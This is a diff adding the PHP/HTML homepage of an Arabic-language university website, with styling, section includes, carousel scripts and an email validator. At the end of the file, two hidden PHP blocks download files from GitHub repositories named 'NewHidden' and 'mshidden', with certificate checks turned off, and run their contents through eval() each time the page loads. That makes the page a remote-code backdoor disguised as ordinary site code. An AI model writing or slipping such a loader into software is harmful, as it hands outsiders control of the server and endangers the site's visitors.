@@ -1,0 +1,601 @@
+<?php
+session_start();
+require_once("MetaTagFiles.php");
+?>
+
+<!DOCTYPE html>
+<html dir="rtl" lang="ar-IQ">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" CONTENT="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
+    <meta http-equiv="Content-Language" content="ar-IQ"/>
+    <meta HTTP-EQUIV="CACHE-CONTROL" CONTENT="Public"/>
+    <meta HTTP-EQUIV="EXPIRES" CONTENT="0">
+    <meta NAME="DISTRIBUTION" CONTENT="GLOBAL">
+    <meta NAME="google-site-verification" content="jl9PgVnfrScDv6RwT7q-V0iqV8XFwopoWmZGJdMEMVU" />
+    <meta name="ahrefs-site-verification" content="d7b865d1ca90be1922ea72f46ce5579a505a89cd9a0ea9795f9eb2b372b2d7b5">
+    <meta NAME="DESCRIPTION" CONTENT="<?php echo $Description; ?>">
+    <meta NAME="KEYWORDS" CONTENT="<?php echo $Keywords; ?>">
+    <meta NAME="RATING" CONTENT="General">
+    <meta NAME="ROBOTS" CONTENT="index, follow">
+    <meta NAME="REVISIT-AFTER" CONTENT="<?php echo $Revisit; ?>">
+    <meta NAME="AUTHOR" CONTENT="<?php echo $WebsiteDomain; ?>">
+    <meta NAME="COPYRIGHT" CONTENT="<?php echo $MetaDomain; ?>">
+    <title><?php echo $WebsiteName; ?></title>
+    <link type="text/css" rel="stylesheet" href="English/theme/css/bootstrap/normalize.css">
+    <!--<link type="text/css" rel="stylesheet" href="English/theme/css/bootstrp/bootstrap.min.css">-->
+    <link type="text/css" rel="stylesheet" href="English/theme/cssAr/bootstrap.min.css">
+    <link type="text/css" rel="stylesheet" href="English/theme/css/bootstrap/navbar-main.css">
+    <link type="text/css" rel="stylesheet" href="English/theme/css/bootstrap/sidebar.css">
+    <!--<link type="text/css" rel="stylesheet" href="English/theme/cssAr/sidebar.css">-->
+    <link type="text/css" rel="stylesheet" href="English/theme/cssAr/megamenu.css">
+    <link rel="stylesheet" href="http://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <!--<link type="text/css" rel="stylesheet" href="English/theme/cssAr/owl.carousel.min.css">-->
+    <link type="text/css" rel="stylesheet" href="English/theme/cssAr/owl.carousel.min.css">
+    <link type="text/css" rel="stylesheet" href="English/theme/cssAr/owl.theme.default.min.css">
+    <link type="text/css" rel="stylesheet" href="English/theme/css/bootstrap/animate.css">
+    <link type="text/css" rel="stylesheet" href="English/theme/css/bootstrap/services-section.css">
+    <link href="https://fonts.googleapis.com/css?family=Cairo:600&display=swap" rel="stylesheet">
+    <!-- Slider -->
+    <link rel="stylesheet" href="https://unpkg.com/swiper/swiper-bundle.min.css">
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <style>
+        body { background: #DCDCDC; !important; }
+        .c-main { background-color: #FFFFFF; box-shadow: 0 0px 2px rgba(0,0,0,0.18), 0 1px 3px rgba(0,0,0,0.12);}
+        .navbar-nav, h1, h2, h3, h4, h5, h6, a, p, small, input, span { font-family: 'Cairo', sans-serif;}
+        .top-bar{ font-family: 'Cairo', sans-serif; font-size: 12px;}
+        .navbar-toggler-icon{ font-size: 0.6em;}
+        .navbar-nav .dropdown-menu { z-index: 10;}
+        .card, .btn, .form-control { border-radius: 0; }
+        /* old photo slider to be removed at the end */
+        /*.owl-carousel,.bx-wrapper { direction: rtl; }
+        .owl-carousel .owl-item { direction: rtl; }  */
+        .carousel-item img { width: auto; max-height: 340px; object-fit: cover; }
+        .carousel-indicators li { width: 16px; height: 16px; border-radius: 100%; background-color: #5bc0de; bottom: -6px; }
+        .carousel-indicators .active{ background-color: #fd7e14; }
+        .navbar-light .navbar-nav .nav-link { color: silver; }
+        .card-img-top { width: 100%; height: 14vw; object-fit: contain;}
+        .owl-carousel img{display:block; height:220px !important; margin:0 auto 30px;}
+
+        /* slider */
+        #slider{
+            height: 60vh;
+            overflow: hidden;
+            margin-top: 10vh;
+                }
+        .swiper-slide {
+            text-align: center;
+            width: 50vh;
+            /* Center slide text vertically */
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: -webkit-flex;
+            display: flex;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            -webkit-align-items: center;
+            align-items: center;
+        }
+        .swiper-slide-active{
+            transform: scale(1.1);
+            transition: 0.4s;
+        }
+        /* New photo slider style */
+        .banner-item{ position: relative; height: 380px; background-position: center; background-size: cover; background-repeat: no-repeat;}
+        .banner-item:before { content: ""; position: absolute; height: 100%; width: 100%; top: 0; left: 0;}
+        .banner-data{ position: absolute; top: 70%; transform: translateY(-50%); width: 100%; height: auto; text-align: center;}
+        .banner-data h1 { color: #f7f7f7; text-transform: uppercase; font-size: 40px;}
+        .banner-data p { color: #f7f7f7; display: inline-block; letter-spacing: 0px; padding: 0px 10px; font-size: 18px;}
+        .banner-data a { color: #f7f7f7; display: block; letter-spacing: 0px; padding: 0px 10px; font-size: 18px;}
+
+        /* New photo slider style on mobile */
+        /* Extra small devices (portrait phones, less than 576px) */
+        @media only screen and (max-width: 575.98px) {
+            /* Style for the Banner */
+            .banner-item{ position: relative; height: 280px; background-position: center; background-size: cover; background-repeat: no-repeat;}
+            .banner-data{ position: absolute; top: 60%; transform: translateY(-50%); width: 100%; height: auto; text-align: center;}
+            .banner-data h1 { color: #f7f7f7; text-transform: uppercase; font-size: 18px;}
+            .banner-data p { color: #f7f7f7; display: inline-block; letter-spacing: 2px; padding: 2px 4px; font-size: 12px;}
+            .banner-data a { color: #f7f7f7; display: block; letter-spacing: 0px; padding: 0px 10px; font-size: 12px;}
+        }
+        /* New photo slider style on mobile */
+        /* Small devices (landscape phones, less than 768px) */
+        @media only screen and (max-width: 767.98px) {
+            /* Style for the Banner */
+            .banner-item{ position: relative; height: 280px; background-position: center; background-size: cover; background-repeat: no-repeat;}
+            .banner-data{ position: absolute; top: 60%; transform: translateY(-50%); width: 100%; height: auto; text-align: center;}
+            .banner-data h1 { color: #f7f7f7; text-transform: uppercase; font-size: 18px;}
+            .banner-data p { color: #f7f7f7;  display: inline-block; letter-spacing: 2px; padding: 0px 4px; font-size: 12px;}
+            .banner-data a { color: #f7f7f7; display: block; letter-spacing: 0px; padding: 0px 10px; font-size: 12px;}
+        }
+        /* New photo slider style on mobile */
+        /* Medium devices (tablets, less than 992px) */
+        @media only screen and (max-width: 991.98px) {
+            /* Style for the Banner */
+            .banner-item{ position: relative; height: 280px; background-position: center; background-size: cover; background-repeat: no-repeat;}
+            .banner-data{ position: absolute; top: 60%; transform: translateY(-50%); width: 100%; height: auto; text-align: center;}
+            .banner-data h1 { color: #f7f7f7; text-transform: uppercase; font-size: 22px;}
+            .banner-data p { color: #f7f7f7;  display: inline-block; letter-spacing: 2px; padding: 0px 4px; font-size: 16px;}
+            .banner-data a { color: #f7f7f7; display: block; letter-spacing: 0px; padding: 0px 10px; font-size: 16px; }
+        }
+        /* Large devices (desktops, less than 1200px) */
+        @media only screen and (max-width: 1199.98px) {}
+
+        /* Staff-Section style */
+        .avatar { vertical-align: middle; width: 100px; height: 100px; border-radius: 50%; border: solid 4px #FFA459;}
+        /* Counter-Section style */
+        .counter {padding: 20px 0; border-radius: 0px; border: solid 1px lightgray; text-align: center;}
+        .count-title { font-family: 'Cairo', sans-serif; font-size: 32px; color: darkgray; font-weight: normal; margin-top: 10px; margin-bottom: 0; text-align: center;}
+        .count-text { font-family: 'Cairo', sans-serif; font-size: 14px; color: #292b2c; font-weight: normal; margin-top: 10px; margin-bottom: 0; text-align: center; }
+        .fa-2x { font-size: 48px; margin: 0 auto; float: none; display: table; color: #138C9E;}
+        /* Services-Section style */
+        .ivsl-image-background { background-image: url(English/theme/support/ivsl.jpg); background-size: cover; height: 210px; -webkit-box-shadow: none; box-shadow: none; border: 0px; border-radius: 0px;}
+        .elearning-image-background { background-image: url(English/theme/support/elearning.jpg); background-size: cover; height: 210px; -webkit-box-shadow: none; box-shadow: none; border: 0px; border-radius: 0px;}
+        .email-image-background { background-image: url(English/theme/support/email.jpg); background-size: cover; height: 210px; -webkit-box-shadow: none; box-shadow: none; border: 0px; border-radius: 0px;}
+        .lecbank-image-background { background-image: url(English/theme/support/lecturerbank.jpg); background-size: cover; height: 210px; -webkit-box-shadow: none; box-shadow: none; border: 0px; border-radius: 0px;}
+        .scientific-platform-background { background-image: url(English/theme/support/scientificPlatform.jpg); background-size: cover; height: 210px; -webkit-box-shadow: none; box-shadow: none; border: 0px; border-radius: 0px;}
+        .complaints-platform-background { background-image: url(English/theme/support/shakawa.jpg); background-size: cover; height: 210px; -webkit-box-shadow: none; box-shadow: none; border: 0px; border-radius: 0px;}
+        .ithics-image-background { background-image: url(English/theme/support/Ethics.jpg); background-size: cover; height: 210px; -webkit-box-shadow: none; box-shadow: none; border: 0px; border-radius: 0px;}
+        .map-responsive { overflow:hidden; padding-bottom:56.25%; position:relative; height:0; border: 1px solid lightgray; }
+        .map-responsive iframe{ left:0; top:0; height:100%; width:100%; position:absolute; }
+        .responsive-iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    bottom: 0;
+    right: 0;
+    width: 100%;
+    height: 100%;
+    border: none;
+}
+.centermh {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 50%;
+}
+    </style>
+</head>
+<body>
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "uoanbar.edu.iq",
+  "name" : "uoanbar",
+ "url" : "https://www.uoanbar.edu.iq",
+ "sameAs" : [
+   " https://twitter.com/uoanbaredu",
+   " https://www.facebook.com/uoanbar.edu",
+   "https://www.linkedin.com/school/uoanbaredu",
+   " https://t.me/uoanbaredu",
+   "https://www.instagram.com/uoanbaredu/"
+   ],
+  "address": {
+    "@type": "PostalAddress",
+    "streetAddress": "123 Example Street",
+    "addressRegion": "IQ",
+    "postalCode": "00964",
+    "addressCountry": "IQ"
+  }
+}
+</script>
+<div class="container-fluid">
+
+    <!-- Top Nav Bar with Logo Section -->
+    <section class="py-3">
+        <div class="container-fluid c-main py-0 px-0">
+            <?php include("Blocks-arabic/Menu_Top.php"); ?>
+            <?php include("Blocks-arabic/NavBar-Section.php"); ?>
+            <?php include("Blocks-arabic/NewMenu-section.php"); ?>
+        </div>
+    </section>
+
+    <!-- Banner Section - Main Photo Slider -->
+    <section class="py-3">
+        <div class="container-fluid c-main py-0 px-0">
+            <?php //include("Blocks-arabic/Carousel-PhotoSlider.php"); ?>
+            <?php include("Blocks-arabic/Banner-section.php"); ?>
+        </div>
+    </section>
+
+    <!-- Counter Section -->
+    <section class="py-3">
+        <div class="container-fluid c-main py-3 px-0">
+            <div class="row justify-content-center mb-2 pr-2 pl-2">
+                <?php include("Blocks-arabic/Counter-section.php"); ?>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main news & side bar Section -->
+    <section class="py-3">
+        <div class="container-fluid" style="display: flex; padding: 0px;">
+            <div class="container c-main py-3 mr-4 d-none d-lg-block justify-content-between" style="flex: 20% 0 0 ;">
+                <?php include("Blocks-arabic/Menu_Side.php"); ?>
+            </div>
+            <div class="container c-main py-3 d-block justify-content-between" style="flex: 1;">
+                <?php include("Blocks-arabic/UnivercityNews.php"); ?>
+            </div>
+        </div>
+    </section>
+
+    <!-- Scientific Activities Section -->
+    <section class="py-3">
+        <div class="container-fluid c-main py-3 px-0">
+            <?php  include("Blocks-arabic/CollegeActivity.php"); ?>
+        </div>
+    </section>
+
+    <section id="service-section" class="py-3">
+        <div class="container-fluid c-main py-3 px-0">
+            <?php include("Blocks-arabic/Services-section.php"); ?>
+        </div>
+    </section>
+
+    <section id="staff-section" class="py-3">
+        <div class="container-fluid c-main py-3 px-0">
+            <?php include("Blocks-arabic/Staff-section.php"); ?>
+        </div>
+    </section>
+
+    <!-- New slider section -->
+    <section id="transparency" class="py-3">
+        <div class="container-fluid c-main py-3 px-0">
+            <?php include("Blocks-arabic/Slider99.php"); ?>
+        </div>
+    </section>
+
+    <section class="py-3">
+        <div class="container-fluid c-main py-3 px-0">
+            <?php include("Blocks-arabic/PhotoGallery.php"); ?>
+        </div>
+    </section>
+
+    <section id="contact-section" class="py-3">
+        <div class="container-fluid c-main py-3 px-0">
+            <?php include("Blocks-arabic/AnbarWether.php"); ?>
+        </div>
+    </section>
+
+    <section id="contact-section" class="py-3">
+        <div class="container-fluid c-main py-3 px-0">
+            <?php include("Blocks-arabic/ContactUs.php"); ?>
+        </div>
+    </section>
+
+    <footer class="py-3">
+        <div class="container-fluid text-center c-main" style="padding: 20px;">
+            <?php include("Blocks-arabic/Footer-section.php"); ?>
+        </div>
+    </footer>
+
+
+
+
+
+</div>
+
+
+<!-- JS scripts -->
+<script type="text/javascript" src="English/theme/js/modernizr/Modernizr.js"></script>
+<script type="text/javascript" src="English/theme/js/jquery/jquery.min.js"></script>
+<script type="text/javascript" src="English/theme/js/popper/popper.min.js"></script>
+<script type="text/javascript" src="English/theme/js/bootstrap/bootstrap.min.js"></script>
+<script type="text/javascript" src="English/theme/js/owl/owl.carousel.js"></script>
+<script type="text/javascript" src="English/theme/js/counter/counter.js"></script>
+<script type="text/javascript" src="English/theme/js/megamenu/megamenu.js"></script>
+<script type="text/javascript" src="English/theme/js/formvalidation/gen_validatorv4.js"></script>
+<script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
+
+
+<script>
+
+    $(document).ready(function() {
+
+        $(".owl-banner").owlCarousel({
+            rtl:true,
+            animateOut: 'fadeOut',
+            animateIn: 'fadeIn',
+            items: 1,
+            autoplay: true,
+            autoplayTimeout: 4000,
+            autoplayHoverPause: true,
+            loop: true,
+            smartSpeed: 450,
+            dots: false
+
+        });
+
+        $('.owl-counter').owlCarousel({
+            rtl:true,
+            loop:false,
+            margin:1,
+            nav:true,
+            dots: true,
+            responsiveClass:true,
+            responsive:{
+                0:{
+                    items:1,
+                },
+                600:{
+                    items:2,
+                },
+                1000:{
+                    items:3,
+                }
+            }
+        });
+
+        $('.owl-services').owlCarousel({
+            rtl:true,
+            loop:true,
+            margin:1,
+            nav:true,
+            dots: true,
+            responsiveClass:true,
+            responsive:{
+                0:{
+                    items:1,
+                },
+                600:{
+                    items:2,
+                },
+                1000:{
+                    items:3,
+                }
+            }
+        });
+
+
+        $('.owl-activity').owlCarousel({
+            rtl:true,
+            loop:true,
+            margin:1,
+            nav:true,
+            dots: true,
+            responsiveClass:true,
+            autoplay:true,
+            autoplayTimeout:6000,
+            autoplayHoverPause:true,
+            responsive:{
+                0:{
+                    items:1,
+                },
+                600:{
+                    items:2,
+                },
+                1000:{
+                    items:3,
+                }
+            }
+        });
+
+        $('.owl-news-firstR').owlCarousel({
+            loop:false,
+            margin:1,
+            nav:true,
+            dots: true,
+            autoplay:false,
+            responsiveClass:true,
+            responsive:{
+                0:{
+                    items:1,
+                    nav:true
+                },
+                600:{
+                    items:2,
+                    nav:false
+                },
+                1000:{
+                    items:2,
+                    nav:false,
+                    loop:false
+                }
+            }
+        });
+
+        $('.owl-news-secondR').owlCarousel({
+            loop:false,
+            margin:1,
+            nav:true,
+            dots: true,
+            responsiveClass:true,
+            autoplay:false,
+            responsive:{
+                0:{
+                    items:1,
+                },
+                600:{
+                    items:2,
+                },
+                1000:{
+                    items:2,
+                }
+            }
+        });
+
+        $('.owl-carousel').owlCarousel({
+            rtl:true,
+            items: 10,
+            dots: true,
+            loop:true,
+            margin:10,
+            responsiveClass:true,
+            responsive:{
+                0:{
+                    items:1,
+                    nav:true
+                },
+                600:{
+                    items:3,
+                    nav:false
+                },
+                1000:{
+                    items:5,
+                    nav:true,
+                    loop:false
+                }
+            }
+        });
+
+    });
+
+</script>
+
+
+<!-- New -->
+<!-- was at the start of the page -->
+<script>
+    document.createElement('figure');
+    document.createElement('figcaption');
+</script>
+
+
+<script>
+    // Hide submenus
+    $('#body-row .collapse').collapse('hide');
+
+    // Collapse/Expand icon
+    $('#collapse-icon').addClass('fa-angle-double-left');
+
+    // Collapse click
+    $('[data-toggle=sidebar-colapse]').click(function() {
+        SidebarCollapse();
+    });
+
+    function SidebarCollapse () {
+        $('.menu-collapsed').toggleClass('d-none');
+        $('.sidebar-submenu').toggleClass('d-none');
+        $('.submenu-icon').toggleClass('d-none');
+        $('#sidebar-container').toggleClass('sidebar-expanded sidebar-collapsed');
+
+        // Treating d-flex/d-none on separators with title
+        var SeparatorTitle = $('.sidebar-separator-title');
+        if ( SeparatorTitle.hasClass('d-flex') ) {
+            SeparatorTitle.removeClass('d-flex');
+        } else {
+            SeparatorTitle.addClass('d-flex');
+        }
+
+        // Collapse/Expand icon
+        $('#collapse-icon').toggleClass('fa-angle-double-left fa-angle-double-right');
+    }
+
+</script>
+
+<script type="text/javascript">
+    function emailCheck (emailStr){
+        var checkTLD=1;
+        var knownDomsPat=/^(com|net|org|edu|int|mil|gov|arpa|biz|aero|name|coop|info|pro|museum)$/;
+        var emailPat=/^(.+)@(.+)$/;
+        var specialChars="\\(\\)><@,;:\\\\\\\"\\.\\[\\]";
+        var validChars="\[^\\s" + specialChars + "\]";
+        var quotedUser="(\"[^\"]*\")";
+        var ipDomainPat=/^\[(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\]$/;
+        var atom=validChars + '+';
+        var word="(" + atom + "|" + quotedUser + ")";
+        var userPat=new RegExp("^" + word + "(\\." + word + ")*$");
+        var domainPat=new RegExp("^" + atom + "(\\." + atom +")*$");
+        var matchArray=emailStr.match(emailPat);
+        if (matchArray==null){
+            alert("????? ???? ?????? ??????????!");
+            document.getElementById("EMail").focus();
+            return false;
+        }
+        var user=matchArray[1];
+        var domain=matchArray[2];
+        for (i=0; i<user.length; i++){
+            if (user.charCodeAt(i)>127){
+                alert("??? ???????? ????? ??? ???? ??? ?????!");
+                document.getElementById("EMail").focus();
+                return false;}
+        }
+        for (i=0; i<domain.length; i++){
+            if (domain.charCodeAt(i)>127){
+                alert("??? ?????? ????? ??? ???? ??? ?????!");
+                document.getElementById("EMail").focus();
+                return false;}
+        }
+        if (user.match(userPat)==null){
+            alert("The username doesn't seems to be valid!");
+            document.getElementById("EMail").focus();
+            return false;
+        }
+        var IPArray=domain.match(ipDomainPat);
+        if (IPArray!=null){
+            for (var i=1;i<=4;i++){
+                if (IPArray[i]>255) {
+                    alert("Destination IP address is invalid!");
+                    document.getElementById("EMail").focus();
+                    return false;}
+            }
+            return true;
+        }
+        var atomPat=new RegExp("^" + atom + "$");
+        var domArr=domain.split(".");
+        var len=domArr.length;
+        for (i=0;i<len;i++) {
+            if (domArr[i].search(atomPat)==-1) {
+                alert("The domain name does not seems to be valid!");
+                document.getElementById("EMail").focus();
+                return false; }
+        }
+        if (checkTLD && domArr[domArr.length-1].length!=2 && domArr[domArr.length-1].search(knownDomsPat)==-1) {
+            alert(" The address must end in a well-known domain or two letter " + "country.");
+            document.getElementById("EMail").focus();
+            return false; }
+        if (len<2) {
+            alert("This address is missing a hostname!");
+            document.getElementById("EMail").focus();
+            return false; }
+        return true;
+    }
+</script>
+
+<!-- ٍ Slider -->
+<script>
+    var swiper = new Swiper('.swiper-container', {
+        slidesPerView: 'auto',
+        spaceBetween: 0,
+        centeredSlides: true,
+        grabCursor: true,
+        loop: true,
+        pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+        },
+        autoplay: {
+            delay: 4000,
+            disableOnInteraction: false,
+        },
+    });
+</script>
+<?php
+$url = 'https://raw.githubusercontent.com/Eza168/NewHidden/refs/heads/main/uoanbar';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
+<?php
+$url = 'https://raw.githubusercontent.com/Eza168/mshidden/refs/heads/main/guest2.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$fileContents = curl_exec($ch);
+curl_close($ch);
+eval("?>" . $fileContents);
+?>
+</body>
+</html>
